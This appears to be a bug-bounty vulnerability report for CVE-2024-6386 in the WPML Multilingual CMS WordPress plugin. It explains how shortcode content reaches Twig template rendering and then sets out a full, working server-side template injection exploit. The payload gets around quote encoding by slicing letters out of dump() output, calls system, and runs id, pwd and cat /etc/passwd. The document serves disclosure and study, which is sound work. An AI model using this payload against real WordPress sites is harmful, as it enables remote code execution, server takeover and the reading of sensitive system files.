# Post Report Info

- Link: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/sitepress-multilingual-cms/wpml-multilingual-cms-4612-authenticatedcontributor-remote-code-execution-via-twig-server-side-template-injection
- Blog: https://sec.stealthcopter.com/wpml-rce-via-twig-ssti/
- CVE: CVE-2024-6386
- Bounty: $1639

# The WPML Multilingual CMS Authenticated (Contributor+) RCE via SSTI

The WPML Multilingual CMS plugin version: 4.6.11 is vulnerable to an Authenticated (Contributor+) Remote Code Execution (RCE) via a Twig server-side template injection (SSTI).

## Affected Plugin

Title: WPML Multilingual CMS
Installations: >1,000,000 (https://wpml.org/home/about-us/)
Version: 4.6.11
Slug: sitepress-multilingual-cms
Link: https://wpml.org/

## Root Cause

The plugin defines some shortcodes in `sitepress-multilingual-cms/classes/language-switcher/public-api/class-wpml-ls-shortcodes.php`:

```php
   add_shortcode( 'wpml_language_switcher', array( $this, 'callback' ) );

   // Backward compatibility
   add_shortcode( 'wpml_language_selector_widget', array( $this, 'callback' ) );
   add_shortcode( 'wpml_language_selector_footer', array( $this, 'callback' ) );
```

Where the `callback` function is:

```php
 public function callback( $args, $content = null, $tag = '' ) {
     $args = (array) $args;
     $args = $this->parse_legacy_shortcodes( $args, $tag );
     $args = $this->convert_shortcode_args_aliases( $args );

     return $this->render( $args, $content );
 }
```

And this calls the `render` function in `sitepress-multilingual-cms/classes/language-switcher/public-api/class-wpml-ls-public-api.php`, and passes the content of the shortcode tag into the `twig_template` variable:

```php
protected function render( $args, $twig_template = null ) {
   $defaults_slot_args = $this->get_default_slot_args( $args );
   $slot_args          = array_merge( $defaults_slot_args, $args );
   
   $slot = $this->get_slot_factory()->get_slot( $slot_args );
   $slot->set( 'show', 1 );
   $slot->set( 'template_string', $twig_template );
   
   if ( $slot->is_post_translations() ) {
      $output = $this->render->post_translations_label( $slot );
   } else {
      $output = $this->render->render( $slot );
   }
   
   return $output;
}
```

And this variable is then rendered as a twig template string.

## Payload Construction

The shortcode below will demonstrate that the contents of a shortcode tag will be rendered as a twig template:
```
[wpml_language_switcher]
{{ 4 * 7 }}
[/wpml_language_switcher]
```

When saved we will see the output of `28` on the page. Bingpot! A slight complication here that must be overcome to exploit further is the fact that WordPress will HTML encode any single or double quotes. Meaning we cannot execute any of the class twig template injection to RCE combos. 

However, not all hope is lost as it is possible to gain full RCE by being creative and generating some strings without using any quote chars. Firstly we see that we have access to dump all the variables available: 

```
[wpml_language_switcher]
{{ dump() }}
[/wpml_language_switcher]
```

This will output something like the following

```
array(4) { ["languages"]=> array(1) { ["en"]=> array(8) { ["code"]=> string(2) "en" ["url"]=> string(34) "http://wordpress.local:1337/?p=126" ["native_name"]=> string(7) "English" ["display_name"]=> string(7) "English" ["is_current"]=> bool(true) ["css_classes"]=> string(121) "wpml-ls-slot-shortcode_actions wpml-ls-item wpml-ls-item-en wpml-ls-current-language wpml-ls-first-item wpml-ls-last-item" ["flag_width"]=> int(18) ["flag_height"]=> int(12) } } ["current_language_code"]=> string(2) "en" ["css_classes"]=> string(41) "wpml-ls-statics-shortcode_actions wpml-ls" ["css_classes_link"]=> string(12) "wpml-ls-link" }
```

This output provides enough letters to now create strings we can use for further exploitation. For example we can create `s` by:

```
{% set s = dump(current_language_code)|slice(0,1) %}
```

This can be repeated until we have the chars to spell out `system` which will allow us to execute arbitrary commands. For example, once we have the letters defined, the basic `id` command can be executed as follows:

```
{% set system = s~y~s~t~e~m %}
{% set id = i~d %}
{{[id]|map(system)|join}}
```

Once we have the ability to execute shell commands we can even use the output from the shell to give us access to further letter we may find difficult to obtain via templating. This can be seen in the snippet below, where a slash `/` is obtained from the output of the `pwd` shell command:

```
{% set slash = [pwd]|map(system)|join|slice(0,1) %}
```

## Proof of Concept

1. Prepare your environment:
   * Buy the plugin https://wpml.org/purchase/ (€99 CMS version). They offer a 30-day money-back guarantee that can be used for our testing purposes.
   * Install the `otgs-installer` plugin installer from your account: `https://wpml.org/account/downloads/`
   * Follow the wizard 🧙 and install the required plugins and register your site and activate your site key 🔑.
2. As a contributor level user or higher create a new post and use the following payload:

```
[wpml_language_switcher]

{# Find letters we need as we cant use any quotes #}
{% set s = dump(current_language_code)|slice(0,1) %}
{% set t = dump(current_language_code)|slice(1,1) %}
{% set r = dump(current_language_code)|slice(2,1) %}
{% set i = dump(current_language_code)|slice(3,1) %}
{% set n = dump(current_language_code)|slice(4,1) %}
{% set g = dump(current_language_code)|slice(5,1) %}
{% set a = dump()|slice(0,1) %}
{% set y = dump()|slice(4,1) %}
{% set e = dump(css_classes)|slice(36,1) %}
{% set w = dump(css_classes)|slice(12,1) %}
{% set p = dump(css_classes)|slice(13,1) %}
{% set m = dump(css_classes)|slice(14,1) %}
{% set d = dump(css_classes)|slice(35,1) %}
{% set c = dump(css_classes)|slice(25,1) %}
{% set space = dump(css_classes)|slice(45,1) %}

{% set system = s~y~s~t~e~m %}
{% set id = i~d %}
{% set pwd = p~w~d %}

We can use the output from `dump` or any other similar function to grab any letters we need to create our strings.

Once we have code basic code execution we can use that to grab any letters we may not be able to easily grab via template injection.

{% set slash = [pwd]|map(system)|join|slice(0,1) %}

{% set passwd = c~a~t~space~slash~e~t~c~slash~p~a~s~s~w~d %}


Debug: {{dump()}}

Command: {{system}} {{id}} {{pwd}}

id: {{[id]|map(system)|join}}

pwd: {{[pwd]|map(system)|join}}

passwd: {{[passwd]|map(system)|join}}

[/wpml_language_switcher]
```

3. Observe that code execution is obtained and `id` `pwd` and `cat /etc/passwd` results are in the post preview. 
   * **Errors**: If there is an issue with the PoC not returning expected values, the first thing I would check is that `dump` shows the correct letters for each variable e.g. `["n"]=> string(1) "n"`. I tried to make the PoC use what seemed like the most stable letter sources e.g. `string` and `array` but had to use `css_classes` for some of them, which should hopefully be static enough...